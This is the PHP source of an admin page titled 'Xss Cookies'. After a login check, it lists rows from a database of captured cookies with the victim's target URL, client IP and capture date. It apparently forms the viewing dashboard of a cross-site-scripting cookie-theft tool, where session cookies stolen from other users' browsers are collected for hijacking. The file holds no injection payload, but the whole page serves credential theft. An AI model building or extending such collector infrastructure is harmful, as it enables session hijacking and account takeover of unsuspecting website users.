<?php
  include("./config.php");
  session_start();
  //  判断是否登陆
  if (!isset($_SESSION["admin"]) or $_SESSION["admin"] !== true) {
    //  验证失败
    $_SESSION["admin"] = false;
    header("Location: " . "./login.php");
    die();
  }
?>
<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Xss Cookies</title>
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <style>
          td:nth-child(2) {
            max-width: 180px;
          }
          td:nth-child(3) {
            max-width: 360px;
          }
        </style>
    </head>
    <body class="bg-dark">
        <div class="container">
          <div class="card text-white bg-success text-center m-3 p-3">
            <h3 class="card-header bg-success">🍪Xss Cookies</h3>
            <div class="card-body table-responsive">
              <table class="table table-hover text-white">
                <thead>
                  <tr>
                    <th scope="col">Id</th>
                    <th scope="col-2">Url</th>
                    <th scope="col">Cookies</th>
                    <th scope="col">Client ip</th>
                    <th scope="col">Add date</th>
                  </tr>
                </thead>
                <tbody>
                  <script>
                    Notiflix.Loading.Hourglass('Loading...');
                  </script>
                  <?php
                    function p($value) {
                      return htmlspecialchars($value, ENT_QUOTES, 'UTF-8', false);
                    }

                    $sql = "SELECT id, target_url, cookies, client_ip, add_date FROM cookies;";
                    $result = $conn->query($sql);
                    if ($result->num_rows > 0) {
                        // echo data
                        while ($row = $result->fetch_assoc()) {
                            echo '<tr>';
                            echo '<td scope="row">' . p($row["id"]) . '</td>';
                            echo '<td><a class="link-info" href="' . p($row["target_url"]) . '" target="_blank">' . p($row["target_url"]) . '</a></td>';
                            echo '<td scope="row">' . p($row["cookies"]) . '</td>';
                            echo '<td scope="row">' . p($row["client_ip"]) . '</td>';
                            echo '<td scope="row">' . p($row["add_date"]) . '</td>';
                            echo '</tr>';
                        }
                    }
                  ?>
                  <script>
                    Notiflix.Loading.Remove();
                  </script>
                </tbody>
              </table>
            </div>
            <div class="card-footer bg-success text-gray-600">
              In the end.
            </div>
          </div>
        </div>
    </body>
</html>